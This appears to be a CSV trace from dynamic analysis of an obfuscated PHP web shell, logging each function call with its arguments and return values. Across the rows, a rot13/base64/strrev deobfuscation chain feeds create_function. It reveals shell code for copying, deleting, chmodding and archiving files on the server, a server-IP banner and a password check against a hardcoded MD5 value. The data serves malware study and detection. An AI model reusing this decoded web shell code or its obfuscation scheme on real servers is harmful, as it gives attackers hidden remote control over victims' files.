uuid,file_md5,index,source,target,argc,argv,return,dynamic
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,972,eval,qufzqe,2.0,"{""value"": [[0, ""BtrIng"", ""9cDQ7xvVgWUMe1zn90wVbHTMiAHoX5lMm1TWhxvVf9FLSWTp3VInQEGCvtFMx92DgcRVhWKq0IzpWbDQ9ytPAfmXexTWWxtPA0KPWbDQ7fJLyWaLtfwpyMaocEvYcVPZOM""], [1, ""show"", 1]]}","{""value"": ""void""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,973,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}","{""value"": ""Str_rot13""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,974,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}","{""value"": ""rqbprQ_46rfnO""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,975,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}","{""value"": ""Onfr64_Qrpbqr""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,976,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}","{""value"": ""Base64_Decode""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,977,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""T2kw""]]}","{""value"": ""Oi0""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,978,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""MDl5""]]}","{""value"": ""09y""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,979,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}","{""value"": ""h9Jn0Azo1M0KyEKLyW3D""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,980,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}","{""value"": ""D3WyLKEyK0M1ozA0nJ9h""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,981,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}","{""value"": ""Q3JlYXRlX0Z1bmN0aW9u""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,982,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}","{""value"": ""Create_Function""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,983,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""9cDQ7xvVgWUMe1zn90wVbHTMiAHoX5lMm1TWhxvVf9FLSWTp3VInQEGCvtFMx92DgcRVhWKq0IzpWbDQ9ytPAfmXexTWWxtPA0KPWbDQ7fJLyWaLtfwpyMaocEvYcVPZOM""]]}","{""value"": ""MaIhL3Eco24tEzyfMI9OL3DbWTSlpzS5YPEuL3EuoTjfWTyhqzIlXD0Xrj0XPJyzXPtxL291oaDtCFOwo3IhqPtxLKWlLKxcXFN9CFNjXFOlMKE1pz4tFz1Qo2EyXPV9CK""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,984,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""MaIhL3Eco24tEzyfMI9OL3DbWTSlpzS5YPEuL3EuoTjfWTyhqzIlXD0Xrj0XPJyzXPtxL291oaDtCFOwo3IhqPtxLKWlLKxcXFN9CFNjXFOlMKE1pz4tFz1Qo2EyXPV9CK""]]}","{""value"": ""ZnVuY3Rpb24gRmlsZV9BY3QoJGFycmF5LCRhY3RhbGwsJGludmVyKQ0Kew0KCWlmKCgkY291bnQgPSBjb3VudCgkYXJyYXkpKSA9PSAwKSByZXR1cm4gSm1Db2RlKCI9PX""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,985,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gRmlsZV9BY3QoJGFycmF5LCRhY3RhbGwsJGludmVyKQ0Kew0KCWlmKCgkY291bnQgPSBjb3VudCgkYXJyYXkpKSA9PSAwKSByZXR1cm4gSm1Db2RlKCI9PX""]]}","{""value"": ""function File_Act($array,$actall,$inver)\r\n{\r\n\tif(($count = count($array)) == 0) return JmCode(\""==t/8FfmkGqbEi+k\"");\r\n\tif($actall ==""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,986,qufzqe,create_function,2.0,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function File_Act($array,$actall,$inver)\r\n{\r\n\tif(($count = count($array)) == 0) return JmCode(\""==t/8FfmkGqbEi+k\"");\r\n\tif($actall ==""]]}","{""value"": ""\\x00lambda_46""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,987,create_function,zend_compile_string,2.0,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function File_Act($array,$actall,$inver)\r\n{\r\n\tif(($count = count($array)) == 0) return JmCode(\""==t/8FfmkGqbEi+k\"");\r\n\tif($actall == 'e')\r\n\t{\r\n     if(($count = count($array)) == 0) return JmCode(\""==t/8FfmkGqbEi+k\"");\r\n\r\n     function listfiles($dir=\"".\"",$faisunZIP,$mydir){\r\n\t\t$sub_file_num = 0;\r\n\t\tif(is_file($mydir.\""$dir\"")){\r\n\t\t  if(realpath($faisunZIP ->gzfilename)!=realpath($mydir.\""$dir\"")){\r\n\t\t\t$faisunZIP -> addfile(file_get_contents($mydir.$dir),\""$dir\"");\r\n\t\t\treturn 1;\r\n\t\t  }\r\n\t\t\treturn 0;\r\n\t\t}\r\n\t\t\r\n\t\t$handle=opendir($mydir.\""$dir\"");\r\n\t\twhile ($file = readdir($handle)) {\r\n\t\t   if($file==\"".\""||$file==\""..\"")continue;\r\n\t\t   if(is_dir($mydir.\""$dir/$file\"")){\r\n\t\t\t $sub_file_num += listfiles(\""$dir/$file\"",$faisunZIP,$mydir);\r\n\t\t   }\r\n\t\t   else {\r\n\t\t   \t   if(realpath($faisunZIP ->gzfilename)!=realpath($mydir.\""$dir/$file\"")){\r\n\t\t\t     $faisunZIP -> addfile(file_get_contents($mydir.$dir.\""/\"".$file),\""$dir/$file\"");\r\n\t\t\t\t $sub_file_num ++;\r\n\t\t\t\t}\r\n\t\t   }\r\n\t\t}\r\n\t\tclosedir($handle);\r\n\t\tif(!$sub_file_num) $faisunZIP -> addfile(\""\"",\""$dir/\"");\r\n\t\treturn $sub_file_num;\r\n\t}\r\n\r\n   function num_bitunit($num){\r\n\t  $bitunit=array(' B',' KB',' MB',' GB');\r\n\t  for($key=0;$key<count($bitunit);$key++){\r\n\t\tif($num>=pow(2,10*$key)-1){\r\n\t\t  $num_bitunit_str=(ceil($num/pow(2,10*$key)*100)/100).\"" $bitunit[$key]\"";\r\n\t\t}\r\n\t  }\r\n\t  return $num_bitunit_str;\r\n   }\r\n\r\n\t$mydir=$_GET['path'].'/';\r\n\t$inver=urldecode($inver);\r\n\tif(is_array($array)){\r\n\t\t$faisunZIP = new PHPzip;\r\n\t\tif($faisunZIP -> startfile(\""$inver\"")){\r\n\t\t\t$filenum = 0;\r\n\t\t\tforeach($array as $file){\r\n\t\t\t\t$filenum += listfiles($file,$faisunZIP,$mydir);\r\n\t\t\t}\r\n\t\t\t$faisunZIP -> createfile();\r\n\t\t\treturn JmCode(\""==NVGmo7ZYohfx8fd3p9Yao0\"").$filenum.JmCode(\""a0wMyWUntRTC+VaL84v/8Ffm2wYV\"").$inver.JmCode(\""=NP2HY8m3i7416mW\"").$inver.JmCode(\""=tPV\"").num_bitunit(filesize(\""$inver\"")).JmCode(\""=4GLijGX\"");\r\n\t\t}else{\r\n\t\t\treturn $inver.JmCode(\""+VaL84lgV3s1ks7kX79mbvf87nei3Xp6llBiesZYewZgDmAk7XYV\"");\r\n\t\t}\r\n\t}else{\r\n\t\treturn JmCode(\""==tClWTChjej/Ff876CiR7Zk1TC1uTA0Gi7j\"");\r\n    }\r\n\r\n\t}\r\n\t$i = 0;\r\n\twhile($i < $count)\r\n\t{\r\n\t\t$array[$i] = urldecode($array[$i]);\r\n\t\tswitch($actall)\r\n\t\t{\r\n\t\t\tcase \""a\"" : $inver = urldecode($inver); if(!is_dir($inver)) return JmCode(\""=ZimgGeg+rej\""); $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = JmCode(\""9JekJGYh\"").$inver.JmCode(\""==NiP/Yk\""); break;\r\n\t\t\tcase \""b\"" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = JmCode(\""==D/m6ol\""); break;\r\n\t\t\tcase \""c\"" : if(!eregi(\""^[0-7]{4}$\"",$inver)) return JmCode(\""==j8B3Bg1nA1DGil\""); $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = JmCode(\""==tdBGZhrQA1DGil\"").$inver; break;\r\n\t\t\tcase \""d\"" : @touch($array[$i],strtotime($inver)); $msg = JmCode(\""==tdBGBikdZk46A0\"").$inver; break;\r\n\t\t}\r\n\t\t$i++;\r\n\t}\r\n\treturn JmCode(\""=4CiR7pbEa/l\"").$msg.JmCode(\""==jmkdrm\"");\r\n}}""]]}","{""value"": ""003E""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,988,qufzqe,__lambda_func,0.0,"{""value"": []}","{""value"": ""void""}",[]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,989,eval,qufzqe,2.0,"{""value"": [[0, ""BtrIng"", ""=0aPAfGXcVlDIIHqZc3n5MIIkAJGIIxLQMRpecIHBy3If9xLAcHru5JIRymIguKZMqUp5qSoCM3ompSrAgxI5bSHCqKGXgzMjE1H41RI5uJGgOGLnOSp0kxZWM2oISxnZc""], [1, ""show"", 1]]}","{""value"": ""void""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,990,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}","{""value"": ""Str_rot13""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,991,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}","{""value"": ""rqbprQ_46rfnO""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,992,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}","{""value"": ""Onfr64_Qrpbqr""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,993,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}","{""value"": ""Base64_Decode""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,994,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""T2kw""]]}","{""value"": ""Oi0""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,995,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""MDl5""]]}","{""value"": ""09y""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,996,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}","{""value"": ""h9Jn0Azo1M0KyEKLyW3D""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,997,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}","{""value"": ""D3WyLKEyK0M1ozA0nJ9h""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,998,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}","{""value"": ""Q3JlYXRlX0Z1bmN0aW9u""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,999,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}","{""value"": ""Create_Function""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1000,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""=0aPAfGXcVlDIIHqZc3n5MIIkAJGIIxLQMRpecIHBy3If9xLAcHru5JIRymIguKZMqUp5qSoCM3ompSrAgxI5bSHCqKGXgzMjE1H41RI5uJGgOGLnOSp0kxZWM2oISxnZc""]]}","{""value"": ""MaIhL3Eco24tnUEgoS9gLJyhXPEjLKEbYPEmnTIfoT5uoJHcrj0XWUAypaMypzyjCJqyqTuip3EvrJ5uoJHbWS9GEIWJEIWoW1ASHyMSHy9BDH1SW10cBj0XnUEgoS9hXR""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1001,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""MaIhL3Eco24tnUEgoS9gLJyhXPEjLKEbYPEmnTIfoT5uoJHcrj0XWUAypaMypzyjCJqyqTuip3EvrJ5uoJHbWS9GEIWJEIWoW1ASHyMSHy9BDH1SW10cBj0XnUEgoS9hXR""]]}","{""value"": ""ZnVuY3Rpb24gaHRtbF9tYWluKCRwYXRoLCRzaGVsbG5hbWUpew0KJHNlcnZlcmlwPWdldGhvc3RieW5hbWUoJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10pOw0KaHRtbF9uKE""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1002,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gaHRtbF9tYWluKCRwYXRoLCRzaGVsbG5hbWUpew0KJHNlcnZlcmlwPWdldGhvc3RieW5hbWUoJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10pOw0KaHRtbF9uKE""]]}","{""value"": ""function html_main($path,$shellname){\r\n$serverip=gethostbyname($_SERVER['SERVER_NAME']);\r\nhtml_n(JmCode(\""==tCykTqcEUC+jJo0uTC\"").$s""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1003,qufzqe,create_function,2.0,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function html_main($path,$shellname){\r\n$serverip=gethostbyname($_SERVER['SERVER_NAME']);\r\nhtml_n(JmCode(\""==tCykTqcEUC+jJo0uTC\"").$s""]]}","{""value"": ""\\x00lambda_47""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1004,create_function,zend_compile_string,2.0,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function html_main($path,$shellname){\r\n$serverip=gethostbyname($_SERVER['SERVER_NAME']);\r\nhtml_n(JmCode(\""==tCykTqcEUC+jJo0uTC\"").$shellname.JmCode(\""+pvpyEaoyA2W942MckJLtpPZ1RmW9tTqxy2qtDTq84wp0kwCaHPZjRmW9tTqxy2qtHTovSTq84GMfEKn09PC\"").$serverip.JmCode(\""a0GM1kJL2OlWyNQZkbQn0EJn3qFCykJr0AUVatTquO3W9HJou5TV0IUphyTC+pvocSJoa0GM1kJL2OlWlIzqhSJMa0GMgSzotpvoyETMcu2W9HTp5EUV0IUphyTC+pvocSJoa0QqyqzpuEUVaDIEUqFCx9Tn0IJot0zpiMTC+DTq84QM09PC\"").$path.JmCode(\""=4GMfWJL09PC+0zpiM2Y84wp09PC+DTqijwCaxPXxS2ofIzph42ocEKLw9Toh4Jnu12W9f2Lck2Lh9TVaVZ0vh8W9HJqfSzqtpPqc1zL1A3W9HTp5EUV0IUphyTCt4mW9JY+ZsFCyIUouMUVaDKngWJqmqFCyOKr0OlW0yJovI3Ha0GMgSzotDKqj5Jn84mWlITqhI2La0woayTouOlWjDGZa0Qn0EJn3OPM0kwCxE3Y84mW\""));\r\nhtml_n(JmCode(\""+jJo0u2Y84GMfWJL09PC+VUqijwCxE3Y84GMgSzpzy2Y84mWkpFClITMl9zLy1JLlMTVaHPZjRmW9DUnayJMbOlWyNQZkpFCbEUMcqUVa4Jnu1JClIzqhSJM/pFCwW3ptpvocSJoa0GMgSzotHJouWaMckwCxEUC+DTqijwCy1JLlMJnijwCaNmW9VKMxW3ovIJouWaMtpFWjNGZa0QqbqJnyuTVaHPZjRmW9tTqxy2qtpPqzITo9VKM25JLy9mW9ZzpmOlW0MJMfqFCy1JLhOFMgSzpzyTC+pPZ3RmW9tTqxy2qtDTq84wp0kwCaNmW9pzocAJLjAUofI2LtpPZa0mMhyTMxSTpfkJMwOPZ9VKMxW3ovOlWypwY1xmW9DUnayJMbOlWyNQZkpFCbEUMcqUVykzLuEUC\""));\r\n}}""]]}","{""value"": ""003E""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1005,qufzqe,__lambda_func,0.0,"{""value"": []}","{""value"": ""void""}",[]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1006,eval,get_magic_quotes_gpc,0.0,"{""value"": []}","{""value"": false}",[]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1007,eval,zend_fetch_r_cookie,1.0,"{""value"": [[0, ""op1"", ""_COOKIE""]]}","{""value"": []}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1008,eval,md5,1.0,"{""value"": [[0, ""str"", ""qdyma4321""]]}","{""value"": ""d73399540b5640f523ef978b13d8c80c""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1009,eval,zend_fetch_r_post,1.0,"{""value"": [[0, ""op1"", ""_POST""]]}","{""value"": []}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1010,eval,zend_fetch_r_post,1.0,"{""value"": [[0, ""op1"", ""_POST""]]}","{""value"": []}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1011,eval,qufzqe,1.0,"{""value"": [[0, ""BtrIng"", ""==tCFIRIBI0Dijm8B3BgeYZ3QY/hah7jG7wHSEyGSARC""]]}","{""value"": ""<CENTER>\\xd3\\xc3\\xbb\\xa7\\xbb\\xf2\\xc3\\xdc\\xc2\\xeb\\xb4\\xed\\xce\\xf3</CENTER>""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1012,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}","{""value"": ""Str_rot13""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1013,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}","{""value"": ""rqbprQ_46rfnO""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1014,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}","{""value"": ""Onfr64_Qrpbqr""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1015,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}","{""value"": ""Base64_Decode""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1016,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""T2kw""]]}","{""value"": ""Oi0""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1017,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""MDl5""]]}","{""value"": ""09y""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1018,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}","{""value"": ""h9Jn0Azo1M0KyEKLyW3D""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1019,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}","{""value"": ""D3WyLKEyK0M1ozA0nJ9h""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1020,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}","{""value"": ""Q3JlYXRlX0Z1bmN0aW9u""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1021,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}","{""value"": ""Create_Function""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1022,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""==tCFIRIBI0Dijm8B3BgeYZ3QY/hah7jG7wHSEyGSARC""]]}","{""value"": ""CRASGyESHw7Gj7hah/YQ3ZYegB3B8mjiD0IBIRIFCt==""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1023,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""CRASGyESHw7Gj7hah/YQ3ZYegB3B8mjiD0IBIRIFCt==""]]}","{""value"": ""PENFTlRFUj7Tw7unu/LD3MLrtO3O8zwvQ0VOVEVSPg==""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1024,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""PENFTlRFUj7Tw7unu/LD3MLrtO3O8zwvQ0VOVEVSPg==""]]}","{""value"": ""<CENTER>\\xd3\\xc3\\xbb\\xa7\\xbb\\xf2\\xc3\\xdc\\xc2\\xeb\\xb4\\xed\\xce\\xf3</CENTER>""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1025,eval,islogin,2.0,"{""value"": [[0, ""shellname"", ""\\xce\\xa2\\xc7\\xe6\\xb0\\xb2\\xc8\\xab\\xbc\\xec\\xb2\\xe2""], [1, ""myurl"", """"]]}","{""value"": ""void""}","[0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1026,islogin,qufzqe,1.0,"{""value"": [[0, ""BtrIng"", ""==jW9LJMluTVukwClWTC+plB4OUZjRwBhy2MlSJo7tUplVwBa5JnxEJLjgwZlVmVtDJnf92pttUpkbwpyEzpiW2B4OUZjHwBbEUMcq3W9HTo5E3ptLKnxkwClITqhI2L84""]]}","{""value"": ""<style type=\""text/css\"">body,td{font-size: 12px;color:#00ff00;background-color:#000000;}input,select,textarea{font-size: 12px;backg""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1027,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}","{""value"": ""Str_rot13""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1028,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}","{""value"": ""rqbprQ_46rfnO""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1029,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}","{""value"": ""Onfr64_Qrpbqr""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1030,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}","{""value"": ""Base64_Decode""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1031,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""T2kw""]]}","{""value"": ""Oi0""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1032,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""MDl5""]]}","{""value"": ""09y""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1033,qufzqe,strtr,3.0,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}","{""value"": ""h9Jn0Azo1M0KyEKLyW3D""}","[0, 0, 0]"
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1034,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}","{""value"": ""D3WyLKEyK0M1ozA0nJ9h""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1035,qufzqe,str_rot13,1.0,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}","{""value"": ""Q3JlYXRlX0Z1bmN0aW9u""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1036,qufzqe,base64_decode,1.0,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}","{""value"": ""Create_Function""}",[0]
3a0053cb121b78d28f0d9aafb3493b00,96408e582caf7c87e837d9e992cfccc5,1037,qufzqe,strrev,1.0,"{""value"": [[0, ""str"", ""==jW9LJMluTVukwClWTC+plB4OUZjRwBhy2MlSJo7tUplVwBa5JnxEJLjgwZlVmVtDJnf92pttUpkbwpyEzpiW2B4OUZjHwBbEUMcq3W9HTo5E3ptLKnxkwClITqhI2L84""]]}","{""value"": ""CUA0rJkyVUE5pTH9VaEyrUDiL3AmVw5vo2E5YUExr2MioaDgp2y6MGbtZGWjrQgwo2kipwbwZQOzMwNjB2WuL2gapz91ozDgL29fo3V6VmNjZQNjZQg9nJ5jqKDfp2IfMJ""}",[0]
